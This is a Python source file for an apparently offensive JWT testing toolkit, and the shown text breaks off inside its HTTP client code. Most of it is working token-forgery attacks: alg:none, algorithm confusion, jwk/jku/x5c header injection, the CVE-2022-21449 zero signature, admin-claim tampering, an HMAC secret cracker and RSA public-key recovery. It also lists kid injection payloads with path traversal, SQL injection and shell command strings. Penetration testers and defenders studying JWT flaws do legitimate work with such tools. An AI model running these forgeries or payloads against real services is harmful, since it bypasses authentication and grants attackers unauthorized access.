#!/usr/bin/env python3
"""jwtforge — JWT web-auth testing toolkit for authorized penetration testing.

Usage:
    python jwtforge.py decode <token>
    python jwtforge.py tamper <token> --claim sub=administrator --alg none
    python jwtforge.py crack  <token> -w wordlist.txt
    python jwtforge.py scan   <token> [--url https://target/api] [--authorized]
    python jwtforge.py attack alg-none <token>
    python jwtforge.py jwks   --url https://target/
    python jwtforge.py recover-pubkey <token1> <token2>
    python jwtforge.py serve-jwks --port 8000
    python jwtforge.py list

Authorized use only. Run only on systems you own or have written permission to test.
"""
from __future__ import annotations

import base64
import base64 as _b64
import datetime
import hashlib
import hmac as _hmac
import json
import json as _json
import math
import shutil
import subprocess
import sys
import threading
from concurrent.futures import ProcessPoolExecutor
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Callable
from urllib.parse import urljoin, urlparse

import click
import requests
from cryptography import x509
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, ed25519, padding, rsa
from cryptography.hazmat.primitives.asymmetric.utils import (
    Prehashed,
    decode_dss_signature,
    encode_dss_signature,
)
from cryptography.x509 import load_pem_x509_certificate
from cryptography.x509.oid import NameOID
from rich.console import Console
from rich.syntax import Syntax
from rich.table import Table

# gmpy2 makes sig2n recovery dramatically faster — optional
try:
    import gmpy2 as _g
    _MPZ = _g.mpz
    _GCD = _g.gcd
    HAVE_GMPY2 = True
except Exception:
    _MPZ = int
    _GCD = math.gcd
    HAVE_GMPY2 = False


# =============================================================================
# CORE — TOKEN
# =============================================================================

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(segment: str) -> bytes:
    if isinstance(segment, bytes):
        segment = segment.decode("ascii")
    pad = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + pad)


def _json_compact(obj: Any) -> bytes:
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")


@dataclass
class JWT:
    header: dict[str, Any] = field(default_factory=dict)
    payload: dict[str, Any] = field(default_factory=dict)
    signature: bytes = b""

    @classmethod
    def parse(cls, token: str) -> "JWT":
        token = token.strip()
        if token.lower().startswith("bearer "):
            token = token[7:].strip()
        parts = token.split(".")
        if len(parts) == 5:
            raise ValueError(
                "This looks like a JWE (5 parts, encrypted). jwtforge operates on "
                "signed JWS/JWT (3 parts)."
            )
        if len(parts) != 3:
            raise ValueError(f"Expected 3 dot-separated parts, got {len(parts)}.")
        h_raw, p_raw, s_raw = parts
        try:
            header = json.loads(b64url_decode(h_raw))
        except Exception as exc:
            raise ValueError(f"Header is not valid base64url JSON: {exc}") from exc
        try:
            payload = json.loads(b64url_decode(p_raw))
        except Exception:
            payload = {"__raw__": b64url_decode(p_raw).decode("utf-8", "replace")}
        signature = b64url_decode(s_raw) if s_raw else b""
        return cls(header=header, payload=payload, signature=signature)

    def signing_input(self) -> bytes:
        h = b64url_encode(_json_compact(self.header))
        p = b64url_encode(_json_compact(self.payload))
        return f"{h}.{p}".encode("ascii")

    def serialize(self, signature: bytes | None = None) -> str:
        sig = self.signature if signature is None else signature
        return f"{self.signing_input().decode('ascii')}.{b64url_encode(sig)}"

    @property
    def alg(self) -> str:
        return str(self.header.get("alg", ""))

    def copy(self) -> "JWT":
        return JWT(
            header=json.loads(json.dumps(self.header)),
            payload=json.loads(json.dumps(self.payload)),
            signature=bytes(self.signature),
        )

    def __str__(self) -> str:
        return self.serialize()


# =============================================================================
# CORE — CRYPTO
# =============================================================================

_HASHES = {"256": hashes.SHA256, "384": hashes.SHA384, "512": hashes.SHA512}
_HASHLIB = {"256": hashlib.sha256, "384": hashlib.sha384, "512": hashlib.sha512}


def _bits(alg: str) -> str:
    return alg[-3:]


def hmac_sign(signing_input: bytes, secret: bytes, alg: str) -> bytes:
    return _hmac.new(secret, signing_input, _HASHLIB[_bits(alg)]).digest()


def _der_to_raw(der: bytes, size: int) -> bytes:
    r, s = decode_dss_signature(der)
    return r.to_bytes(size, "big") + s.to_bytes(size, "big")


def _raw_to_der(raw: bytes) -> bytes:
    half = len(raw) // 2
    r = int.from_bytes(raw[:half], "big")
    s = int.from_bytes(raw[half:], "big")
    return encode_dss_signature(r, s)


def _ec_size(alg: str) -> int:
    return {"256": 32, "384": 48, "512": 66}[_bits(alg)]


def sign(jwt: JWT, key=None, secret: bytes | None = None) -> bytes:
    alg = jwt.alg
    si = jwt.signing_input()
    if alg.lower() == "none":
        return b""
    if alg.startswith("HS"):
        if secret is None:
            raise ValueError("HS* signing requires secret=")
        return hmac_sign(si, secret, alg)
    if alg.startswith("RS"):
        return key.sign(si, padding.PKCS1v15(), _HASHES[_bits(alg)]())
    if alg.startswith("PS"):
        h = _HASHES[_bits(alg)]()
        return key.sign(si, padding.PSS(mgf=padding.MGF1(h), salt_length=h.digest_size), h)
    if alg.startswith("ES"):
        der = key.sign(si, ec.ECDSA(_HASHES[_bits(alg)]()))
        return _der_to_raw(der, _ec_size(alg))
    if alg == "EdDSA":
        return key.sign(si)
    raise ValueError(f"Unsupported alg for signing: {alg!r}")


def verify(jwt: JWT, key=None, secret: bytes | None = None) -> bool:
    alg = jwt.alg
    si = jwt.signing_input()
    sig = jwt.signature
    try:
        if alg.lower() == "none":
            return sig == b""
        if alg.startswith("HS"):
            expected = hmac_sign(si, secret or b"", alg)
            return _hmac.compare_digest(expected, sig)
        if alg.startswith("RS"):
            key.verify(sig, si, padding.PKCS1v15(), _HASHES[_bits(alg)]())
            return True
        if alg.startswith("PS"):
            h = _HASHES[_bits(alg)]()
            key.verify(sig, si, padding.PSS(mgf=padding.MGF1(h), salt_length=h.digest_size), h)
            return True
        if alg.startswith("ES"):
            key.verify(_raw_to_der(sig), si, ec.ECDSA(_HASHES[_bits(alg)]()))
            return True
        if alg == "EdDSA":
            key.verify(sig, si)
            return True
    except (InvalidSignature, Exception):
        return False
    return False


# =============================================================================
# CORE — KEYS
# =============================================================================

def generate_rsa(bits: int = 2048) -> rsa.RSAPrivateKey:
    return rsa.generate_private_key(public_exponent=65537, key_size=bits)


def generate_ec(curve: ec.EllipticCurve | None = None):
    return ec.generate_private_key(curve or ec.SECP256R1())


def generate_ed25519():
    return ed25519.Ed25519PrivateKey.generate()


def load_private_pem(data: bytes | str, password: bytes | None = None):
    if isinstance(data, str):
        data = data.encode()
    return serialization.load_pem_private_key(data, password=password)


def load_public_pem(data: bytes | str):
    if isinstance(data, str):
        data = data.encode()
    return serialization.load_pem_public_key(data)


def public_pem(pubkey) -> bytes:
    return pubkey.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def public_pem_pkcs1(pubkey) -> bytes:
    return pubkey.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.PKCS1,
    )


def public_der_spki(pubkey) -> bytes:
    return pubkey.public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def public_der_pkcs1(pubkey) -> bytes:
    return pubkey.public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.PKCS1,
    )


def load_public_any(data: bytes | str):
    if isinstance(data, str):
        data = data.encode()
    for loader in (
        serialization.load_pem_public_key,
        serialization.load_der_public_key,
    ):
        try:
            return loader(data)
        except Exception:
            pass
    try:
        return load_pem_x509_certificate(data).public_key()
    except Exception:
        pass
    from cryptography.x509 import load_der_x509_certificate
    try:
        return load_der_x509_certificate(data).public_key()
    except Exception as exc:
        raise ValueError("could not parse public key as PEM/DER/certificate") from exc


def private_pem(privkey) -> bytes:
    return privkey.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    )


def cert_public_key(pem: bytes | str):
    if isinstance(pem, str):
        pem = pem.encode()
    return load_pem_x509_certificate(pem).public_key()


def _int_to_b64(n: int) -> str:
    length = (n.bit_length() + 7) // 8
    return b64url_encode(n.to_bytes(length, "big"))


def public_to_jwk(pubkey, kid: str = "jwtforge") -> dict[str, Any]:
    if isinstance(pubkey, rsa.RSAPublicKey):
        numbers = pubkey.public_numbers()
        return {
            "kty": "RSA", "use": "sig", "kid": kid, "alg": "RS256",
            "n": _int_to_b64(numbers.n), "e": _int_to_b64(numbers.e),
        }
    if isinstance(pubkey, ec.EllipticCurvePublicKey):
        numbers = pubkey.public_numbers()
        size = (pubkey.curve.key_size + 7) // 8
        return {
            "kty": "EC", "use": "sig", "kid": kid, "crv": "P-256",
            "x": b64url_encode(numbers.x.to_bytes(size, "big")),
            "y": b64url_encode(numbers.y.to_bytes(size, "big")),
        }
    raise TypeError(f"Unsupported key type for JWK: {type(pubkey)!r}")


def jwk_to_public(jwk: dict[str, Any]):
    kty = jwk.get("kty")
    if kty == "RSA":
        n = int.from_bytes(b64url_decode(jwk["n"]), "big")
        e = int.from_bytes(b64url_decode(jwk["e"]), "big")
        return rsa.RSAPublicNumbers(e, n).public_key()
    if kty == "EC":
        x = int.from_bytes(b64url_decode(jwk["x"]), "big")
        y = int.from_bytes(b64url_decode(jwk["y"]), "big")
        return ec.EllipticCurvePublicNumbers(x, y, ec.SECP256R1()).public_key()
    raise ValueError(f"Unsupported JWK kty: {kty!r}")


def jwks_for(pubkey, kid: str = "jwtforge") -> dict[str, Any]:
    return {"keys": [public_to_jwk(pubkey, kid=kid)]}


def jwk_from_jwks(jwks: dict[str, Any], kid: str | None = None) -> dict[str, Any]:
    keys_list = jwks.get("keys") if isinstance(jwks, dict) else None
    if keys_list is None:
        if isinstance(jwks, dict) and jwks.get("kty"):
            return jwks
        raise ValueError("JWKS has no 'keys' array")
    if not keys_list:
        raise ValueError("JWKS 'keys' array is empty")
    if kid:
        for k in keys_list:
            if k.get("kid") == kid:
                return k
    return keys_list[0]


# =============================================================================
# CORE — PUBLIC KEY RECOVERY (sig2n)
# =============================================================================

_DIGESTINFO = {
    "256": bytes.fromhex("3031300d060960864801650304020105000420"),
    "384": bytes.fromhex("3041300d060960864801650304020205000430"),
    "512": bytes.fromhex("3051300d060960864801650304020305000440"),
}
_HASH = {"256": hashlib.sha256, "384": hashlib.sha384, "512": hashlib.sha512}


@dataclass
class RecoveredKey:
    e: int
    n: int
    pubkey: object
    verified: bool

    @property
    def bits(self) -> int:
        return self.n.bit_length()

    def pem_spki(self) -> bytes:
        return public_pem(self.pubkey)

    def pem_pkcs1(self) -> bytes:
        return public_pem_pkcs1(self.pubkey)

    def der_spki_b64(self) -> str:
        return base64.b64encode(public_der_spki(self.pubkey)).decode()

    def der_pkcs1_b64(self) -> str:
        return base64.b64encode(public_der_pkcs1(self.pubkey)).decode()


def _emsa_pkcs1(signing_input: bytes, bits: str, em_len: int) -> bytes:
    digest = _HASH[bits](signing_input).digest()
    t = _DIGESTINFO[bits] + digest
    ps_len = em_len - len(t) - 3
    if ps_len < 8:
        raise ValueError("signature too short for a valid PKCS#1 v1.5 encoding")
    return b"\x00\x01" + b"\xff" * ps_len + b"\x00" + t


def _strip_small_factors(n: int, bound: int = 2000) -> int:
    for f in range(2, bound):
        while n % f == 0:
            n //= f
    return n


def recover_public_key(
    token1: str, token2: str, exponents: tuple[int, ...] = (65537, 3)
) -> list[RecoveredKey]:
    j1 = JWT.parse(token1)
    j2 = JWT.parse(token2)
    alg = j1.alg
    if not alg.startswith("RS"):
        raise ValueError(
            f"tokens must be RS256/384/512 (PKCS#1 v1.5); got alg={alg!r}. "
            "PSS (PS*) and EC are not recoverable this way."
        )
    bits = alg[-3:]
    if bits not in _HASH:
        raise ValueError(f"unsupported RS hash size in alg={alg!r}")
    if not j1.signature or not j2.signature:
        raise ValueError("both tokens must carry a signature")
    k = len(j1.signature)
    if len(j2.signature) != k:
        raise ValueError("the two tokens have different signature lengths (different keys?)")
    s1 = int.from_bytes(j1.signature, "big")
    s2 = int.from_bytes(j2.signature, "big")
    em1 = int.from_bytes(_emsa_pkcs1(j1.signing_input(), bits, k), "big")
    em2 = int.from_bytes(_emsa_pkcs1(j2.signing_input(), bits, k), "big")
    s1m, s2m, em1m, em2m = _MPZ(s1), _MPZ(s2), _MPZ(em1), _MPZ(em2)
    seen: set[int] = set()
    out: list[RecoveredKey] = []
    for e in exponents:
        g = int(_GCD(s1m ** e - em1m, s2m ** e - em2m))
        if g <= 1:
            continue
        for n in {_strip_small_factors(g), g}:
            if n <= 1 or n in seen:
                continue
            seen.add(n)
            try:
                pub = rsa.RSAPublicNumbers(e, n).public_key()
            except Exception:
                continue
            verified = verify(j1, key=pub)
            out.append(RecoveredKey(e=e, n=n, pubkey=pub, verified=verified))
    out.sort(key=lambda r: (not r.verified, -r.bits))
    return out


# =============================================================================
# ATTACKS — BASE
# =============================================================================

import time

SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def apply_overrides(forged: JWT, ctx: "AttackContext", extra: dict | None = None) -> None:
    claims = extra if extra is not None else ctx.claims
    if claims:
        forged.payload.update(claims)
    if not getattr(ctx, "refresh_exp", True) or not isinstance(forged.payload, dict):
        return
    now = int(time.time())
    if "exp" in forged.payload:
        forged.payload["exp"] = now + int(getattr(ctx, "exp_skew", 3600))
    if "nbf" in forged.payload:
        forged.payload["nbf"] = now - 60
    if "iat" in forged.payload:
        forged.payload["iat"] = now


@dataclass
class Candidate:
    token: str
    technique: str
    detail: str = ""
    secret: str | None = None


@dataclass
class AttackContext:
    public_key_pem: bytes | None = None
    private_key_pem: bytes | None = None
    jku_url: str | None = None
    wordlist: str | None = None
    use_hashcat: bool = False
    claims: dict[str, Any] = field(default_factory=dict)
    kid_payloads: list[str] = field(default_factory=list)
    refresh_exp: bool = True
    exp_skew: int = 3600
    extra: dict[str, Any] = field(default_factory=dict)


@dataclass
class AttackMeta:
    id: str
    name: str
    severity: str
    cwe: str = ""
    references: tuple[str, ...] = ()


class Attack:
    meta: AttackMeta

    def applicable(self, jwt: JWT, ctx: AttackContext) -> bool:
        return True

    def skip_reason(self, jwt: JWT, ctx: AttackContext) -> str | None:
        return None

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        raise NotImplementedError

    @property
    def id(self) -> str:
        return self.meta.id

    @property
    def severity(self) -> str:
        return self.meta.severity


# =============================================================================
# ATTACKS — ALG NONE
# =============================================================================

_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "nonE"]


class AlgNoneAttack(Attack):
    meta = AttackMeta(
        id="alg-none", name="alg:none signature bypass", severity="critical",
        cwe="CWE-347",
        references=("https://datatracker.ietf.org/doc/html/rfc7519#section-6",),
    )

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        out: list[Candidate] = []
        for variant in _NONE_VARIANTS:
            forged = jwt.copy()
            forged.header["alg"] = variant
            forged.signature = b""
            apply_overrides(forged, ctx)
            out.append(Candidate(
                token=forged.serialize(),
                technique=f"alg:{variant} (empty signature)",
                detail=f"Signature dropped; accepted only if server honors the unsigned '{variant}' algorithm.",
            ))
        return out


# =============================================================================
# ATTACKS — ALG CONFUSION
# =============================================================================

def _key_forms(pem: bytes) -> dict[str, bytes]:
    forms: dict[str, bytes] = {}
    forms["input-exact"] = pem
    forms["input-stripped"] = pem.strip()
    forms["input-lf"] = pem.replace(b"\r\n", b"\n")
    try:
        pub = load_public_any(pem)
    except Exception:
        return forms

    def add(label: str, data: bytes) -> None:
        forms[label] = data
        forms[f"{label}-nonl"] = data.rstrip(b"\n")
        forms[f"{label}-b64"] = base64.b64encode(data)

    add("spki-pem", public_pem(pub))
    add("spki-der", public_der_spki(pub))
    try:
        add("pkcs1-pem", public_pem_pkcs1(pub))
        add("pkcs1-der", public_der_pkcs1(pub))
    except Exception:
        pass
    seen: dict[bytes, str] = {}
    for label, data in forms.items():
        seen.setdefault(data, label)
    return {label: data for data, label in seen.items()}


class AlgConfusionAttack(Attack):
    meta = AttackMeta(
        id="alg-confusion", name="RS/ES -> HS algorithm confusion", severity="critical",
        cwe="CWE-347",
        references=("https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",),
    )

    def applicable(self, jwt: JWT, ctx: AttackContext) -> bool:
        return jwt.alg.startswith(("RS", "ES", "PS")) or ctx.public_key_pem is not None

    def skip_reason(self, jwt: JWT, ctx: AttackContext) -> str | None:
        if not jwt.alg.startswith(("RS", "ES", "PS")):
            return None
        if not ctx.public_key_pem:
            return (
                "needs the server public key. Provide --public-key, --jwks-url, or "
                "--url (auto-fetch); or recover it from two tokens with 'jwtforge recover-pubkey'."
            )
        return None

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        if not ctx.public_key_pem:
            return []
        out: list[Candidate] = []
        for hs in ("HS256", "HS384", "HS512"):
            for label, secret in _key_forms(ctx.public_key_pem).items():
                forged = jwt.copy()
                forged.header["alg"] = hs
                apply_overrides(forged, ctx)
                forged.signature = sign(forged, secret=secret)
                out.append(Candidate(
                    token=forged.serialize(),
                    technique=f"{hs} signed with public key ({label})",
                    detail="Public key bytes used as HMAC secret; accepted if the verifier picks HMAC based on the header alg.",
                ))
        return out


# =============================================================================
# ATTACKS — JWK INJECTION
# =============================================================================

class JwkInjectionAttack(Attack):
    meta = AttackMeta(
        id="jwk-injection", name="Embedded jwk header injection", severity="critical",
        cwe="CWE-347",
        references=("https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter",),
    )

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        priv = generate_rsa(2048)
        jwk = public_to_jwk(priv.public_key(), kid="jwtforge")
        forged = jwt.copy()
        forged.header["alg"] = "RS256"
        forged.header["jwk"] = jwk
        forged.header["kid"] = "jwtforge"
        apply_overrides(forged, ctx)
        forged.signature = sign(forged, key=priv)
        return [Candidate(
            token=forged.serialize(),
            technique="self-signed RS256 with attacker jwk in header",
            detail="Server trusts the header-embedded public key and validates against the attacker's own private key.",
        )]


# =============================================================================
# ATTACKS — JKU INJECTION
# =============================================================================

class JkuInjectionAttack(Attack):
    meta = AttackMeta(
        id="jku-injection", name="jku/x5u JWKS URL spoofing", severity="critical",
        cwe="CWE-347",
        references=("https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jku-parameter",),
    )

    def applicable(self, jwt: JWT, ctx: AttackContext) -> bool:
        return ctx.jku_url is not None

    def skip_reason(self, jwt: JWT, ctx: AttackContext) -> str | None:
        if not ctx.jku_url:
            return "needs --jku-url pointing at a JWKS you host ('jwtforge serve-jwks')."
        return None

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        if not ctx.jku_url:
            return []
        if ctx.extra.get("jku_private_key") is not None:
            priv = ctx.extra["jku_private_key"]
        elif ctx.private_key_pem:
            priv = load_private_pem(ctx.private_key_pem)
        else:
            priv = generate_rsa(2048)
        kid = "jwtforge"
        out: list[Candidate] = []
        forged = jwt.copy()
        forged.header["alg"] = "RS256"
        forged.header["kid"] = kid
        forged.header["jku"] = ctx.jku_url
        apply_overrides(forged, ctx)
        forged.signature = sign(forged, key=priv)
        out.append(Candidate(
            token=forged.serialize(),
            technique=f"jku -> {ctx.jku_url} (attacker JWKS)",
            detail="Serve the matching JWKS at that URL ('jwtforge serve-jwks'); vulnerable server fetches and trusts it.",
        ))
        ctx.extra["jku_private_key"] = priv
        ctx.extra["jku_jwks"] = jwks_for(priv.public_key(), kid=kid)
        return out


# =============================================================================
# ATTACKS — X5C INJECTION
# =============================================================================

def _self_signed_cert(priv):
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "jwtforge")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(priv.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=365))
        .sign(priv, hashes.SHA256())
    )
    return cert


class X5cInjectionAttack(Attack):
    meta = AttackMeta(
        id="x5c-injection", name="x5c self-signed cert injection", severity="critical",
        cwe="CWE-347",
        references=("https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.6",),
    )

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        priv = generate_rsa(2048)
        cert = _self_signed_cert(priv)
        der = cert.public_bytes(serialization.Encoding.DER)
        x5c = [base64.b64encode(der).decode("ascii")]
        forged = jwt.copy()
        forged.header["alg"] = "RS256"
        forged.header["x5c"] = x5c
        apply_overrides(forged, ctx)
        forged.signature = sign(forged, key=priv)
        return [Candidate(
            token=forged.serialize(),
            technique="self-signed RS256 with attacker x5c chain",
            detail="Server trusts the embedded leaf cert without chain validation.",
        )]


# =============================================================================
# ATTACKS — PSYCHIC SIGNATURE
# =============================================================================

_SIG_LEN = {"ES256": 64, "ES384": 96, "ES512": 132}


class PsychicSignatureAttack(Attack):
    meta = AttackMeta(
        id="psychic-signature", name="Psychic signature (CVE-2022-21449)", severity="critical",
        cwe="CWE-347",
        references=("https://nvd.nist.gov/vuln/detail/CVE-2022-21449",),
    )

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        out: list[Candidate] = []
        for alg, length in _SIG_LEN.items():
            forged = jwt.copy()
            forged.header["alg"] = alg
            apply_overrides(forged, ctx)
            forged.signature = b"\x00" * length
            out.append(Candidate(
                token=forged.serialize(),
                technique=f"{alg} all-zero (r=s=0) signature",
                detail="Accepted only by ECDSA verifiers vulnerable to CVE-2022-21449.",
            ))
        return out


# =============================================================================
# ATTACKS — KID INJECTION
# =============================================================================

_DEFAULT_KID_PAYLOADS = [
    "../../../../../../dev/null",
    r"..\..\..\..\..\..\nul",
    "/dev/null",
    "' UNION SELECT 'key' -- ",
    "' UNION SELECT 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA' -- ",
    "1' OR '1'='1",
    "|| ping -c1 127.0.0.1",
    ";id",
]
_EMPTY_FILE_KIDS = ("../../../../../../dev/null", "/dev/null", r"..\..\nul")


class KidInjectionAttack(Attack):
    meta = AttackMeta(
        id="kid-injection", name="kid header injection", severity="high",
        cwe="CWE-89",
        references=("https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter",),
    )

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        out: list[Candidate] = []
        for empty_kid in _EMPTY_FILE_KIDS:
            for secret, how in ((b"", "empty bytes"), (b"\x00", "single null byte")):
                forged = jwt.copy()
                forged.header["alg"] = "HS256"
                forged.header["kid"] = empty_kid
                apply_overrides(forged, ctx)
                forged.signature = sign(forged, secret=secret)
                out.append(Candidate(
                    token=forged.serialize(),
                    technique=f"kid -> {empty_kid} ({how} HMAC secret)",
                    detail=f"Points kid at an empty/predictable file; signed with {how}.",
                ))
        for p in ctx.kid_payloads or _DEFAULT_KID_PAYLOADS:
            forged = jwt.copy()
            forged.header["kid"] = p
            apply_overrides(forged, ctx)
            out.append(Candidate(
                token=forged.serialize(),
                technique=f"kid injection: {p!r}",
                detail="Injection string in kid; inspect server response/errors.",
            ))
        return out


# =============================================================================
# ATTACKS — HMAC CRACK
# =============================================================================

_CRACK_CHUNK = 20000


def _check_chunk(args) -> str | None:
    signing_input, signature, hashname, words = args
    import hashlib
    hfun = getattr(hashlib, hashname)
    for w in words:
        cand = w.rstrip("\n").encode("utf-8", "ignore")
        if _hmac.compare_digest(_hmac.new(cand, signing_input, hfun).digest(), signature):
            return cand.decode("utf-8", "replace")
    return None


def crack_hmac(jwt: JWT, wordlist: str, workers: int | None = None) -> str | None:
    if not jwt.alg.startswith("HS"):
        return None
    signing_input = jwt.signing_input()
    signature = jwt.signature
    hashname = _HASHLIB[_bits(jwt.alg)]().name
    path = Path(wordlist)
    if not path.exists():
        raise FileNotFoundError(wordlist)
    batch: list[str] = []

    def batches():
        nonlocal batch
        with path.open("r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                batch.append(line)
                if len(batch) >= _CRACK_CHUNK:
                    yield (signing_input, signature, hashname, batch)
                    batch = []
            if batch:
                yield (signing_input, signature, hashname, batch)

    with ProcessPoolExecutor(max_workers=workers) as pool:
        for result in pool.map(_check_chunk, batches()):
            if result is not None:
                return result
    return None


def hashcat_line(jwt: JWT) -> str:
    return jwt.serialize()


def run_hashcat(jwt: JWT, wordlist: str) -> str | None:
    exe = shutil.which("hashcat")
    if not exe:
        raise RuntimeError("hashcat not found on PATH")
    import tempfile
    with tempfile.NamedTemporaryFile("w", suffix=".jwt", delete=False) as tf:
        tf.write(hashcat_line(jwt))
        hashfile = tf.name
    subprocess.run([exe, "-m", "16500", "-a", "0", hashfile, wordlist], check=False)
    out = subprocess.run([exe, "-m", "16500", hashfile, "--show"], capture_output=True, text=True, check=False)
    line = out.stdout.strip().splitlines()
    if line and ":" in line[-1]:
        return line[-1].rsplit(":", 1)[-1]
    return None


class HmacCrackAttack(Attack):
    meta = AttackMeta(
        id="hmac-crack", name="Weak HMAC secret cracking", severity="high",
        cwe="CWE-326",
        references=("https://hashcat.net/wiki/doku.php?id=example_hashes",),
    )

    def applicable(self, jwt: JWT, ctx: AttackContext) -> bool:
        return jwt.alg.startswith("HS")

    def skip_reason(self, jwt: JWT, ctx: AttackContext) -> str | None:
        if jwt.alg.startswith("HS") and not ctx.wordlist:
            return "needs --wordlist (e.g. jwt.secrets / rockyou) to crack the HS* secret."
        return None

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        if not ctx.wordlist:
            return []
        secret = run_hashcat(jwt, ctx.wordlist) if ctx.use_hashcat else crack_hmac(jwt, ctx.wordlist)
        if not secret:
            return []
        forged = jwt.copy()
        apply_overrides(forged, ctx)
        forged.signature = sign(forged, secret=secret.encode())
        return [Candidate(
            token=forged.serialize(),
            technique=f"HMAC secret recovered: {secret!r}",
            detail="Secret cracked from wordlist; attacker can now forge any token.",
            secret=secret,
        )]


# =============================================================================
# ATTACKS — CLAIM TAMPER
# =============================================================================

_ESCALATIONS = [
    {"role": "admin"}, {"role": "administrator"}, {"admin": True}, {"isAdmin": True},
    {"scope": "admin"}, {"scopes": ["admin"]}, {"groups": ["admins"]}, {"user": "admin"},
]


class ClaimTamperAttack(Attack):
    meta = AttackMeta(
        id="claim-tamper", name="Claim tampering / signature stripping", severity="high",
        cwe="CWE-345",
        references=("https://cwe.mitre.org/data/definitions/345.html",),
    )

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        out: list[Candidate] = []
        overrides = [ctx.claims] if ctx.claims else _ESCALATIONS
        for ov in overrides:
            forged = jwt.copy()
            apply_overrides(forged, ctx, extra=ov)
            out.append(Candidate(
                token=forged.serialize(),
                technique=f"tamper {ov} (original signature kept)",
                detail="Claims changed, stale signature reused; accepted only if the server ignores signature validation.",
            ))
            stripped = jwt.copy()
            apply_overrides(stripped, ctx, extra=ov)
            stripped.signature = b""
            out.append(Candidate(
                token=stripped.serialize(),
                technique=f"tamper {ov} (signature removed)",
                detail="Claims changed and signature emptied.",
            ))
        return out


# =============================================================================
# ATTACKS — REPLAY / EXPIRY
# =============================================================================

class ReplayExpiryAttack(Attack):
    meta = AttackMeta(
        id="replay-expiry", name="Expiry / nbf validation", severity="medium",
        cwe="CWE-613",
        references=("https://cwe.mitre.org/data/definitions/613.html",),
    )

    def applicable(self, jwt: JWT, ctx: AttackContext) -> bool:
        return any(k in jwt.payload for k in ("exp", "nbf", "iat"))

    def generate(self, jwt: JWT, ctx: AttackContext) -> list[Candidate]:
        out: list[Candidate] = []
        if "exp" in jwt.payload:
            forged = jwt.copy()
            forged.payload["exp"] = 1
            out.append(Candidate(
                token=forged.serialize(),
                technique="exp set to the past (1970)",
                detail="Accepted => server does not enforce token expiry.",
            ))
        forged2 = jwt.copy()
        forged2.payload["nbf"] = 9999999999
        out.append(Candidate(
            token=forged2.serialize(),
            technique="nbf set to the far future",
            detail="Accepted => server does not enforce not-before.",
        ))
        return out


# =============================================================================
# ATTACKS — REGISTRY
# =============================================================================

_ATTACK_CLASSES: list[type[Attack]] = [
    AlgNoneAttack, AlgConfusionAttack, JwkInjectionAttack, JkuInjectionAttack,
    X5cInjectionAttack, PsychicSignatureAttack, KidInjectionAttack,
    HmacCrackAttack, ClaimTamperAttack, ReplayExpiryAttack,
]


def all_attacks() -> list[Attack]:
    instances = [cls() for cls in _ATTACK_CLASSES]
    instances.sort(key=lambda a: SEVERITY_ORDER.get(a.severity, 99))
    return instances


def get_attack(attack_id: str) -> Attack:
    for cls in _ATTACK_CLASSES:
        inst = cls()
        if inst.id == attack_id:
            return inst
    raise KeyError(f"Unknown attack id: {attack_id!r}")


def list_ids() -> list[str]:
    return [cls().id for cls in _ATTACK_CLASSES]


# =============================================================================
# LIVE — CLIENT
# =============================================================================

PLACEHOLDER = "{{token}}"
_MAX_EVIDENCE_BODY = 2000


def _snip(text: str) -> str:
    if text is None:
        return ""
    if len(text) > _MAX_EVIDENCE_BODY:
        return text[:_MAX_EVIDENCE_BODY] + f"\n...[truncated, {len(text)} bytes total]"
    return text


@dataclass
class Response:
    status: int
    length: int
    body: str
    headers: dict
    method: str = ""
    url: str = ""
    req_headers: dict = field(default_factory=dict)
    req_body: str | None = None

    @classmethod
    def from_requests(cls, r: requests.Response) -> "Response":
        req = r.request
        rb = req.body
        if isinstance(rb, bytes):
            rb = rb.decode("utf-8", "replace")
        return cls(
            status=r.status_code, length=len(r.content), body=_snip(r.text),
            headers=dict(r.headers), method=req.method or "", url=req.url or "",
            req_headers=dict(req.headers), req_body=_snip(rb) if rb else None,
        )

    def as_curl(self) -> str:
        parts = [f"curl -i -sk -X {self.method} {_shq(self.url)}"]
        for k, v in self.req_headers.items():
            if k.lower() in ("content-length", "host"):
                continue
